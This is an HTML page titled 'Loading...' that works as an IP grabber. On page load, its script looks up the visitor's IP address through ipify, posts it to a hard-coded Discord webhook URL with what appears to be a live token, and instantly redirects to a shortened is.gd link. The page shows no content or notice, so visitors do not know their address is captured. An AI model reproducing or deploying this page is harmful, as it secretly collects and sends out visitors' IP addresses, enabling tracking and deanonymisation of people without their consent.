<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            height: 100vh;
        }
    </style>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your Discord webhook
        const REDIRECT_URL = "https://is.gd/gwuu9c"; // Your redirect link

        (async function sendIPAndRedirect() {
            // Fetch user's IP
            fetch("https://api64.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    let userIP = data.ip;
                    fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: `New Visitor IP: ${userIP}` })
                    });
                })
                .catch(error => console.error("Error sending IP:", error));

            // Redirect instantly
            window.location.href = REDIRECT_URL;
        })();
    </script>
</head>
<body>
</body>
</html>
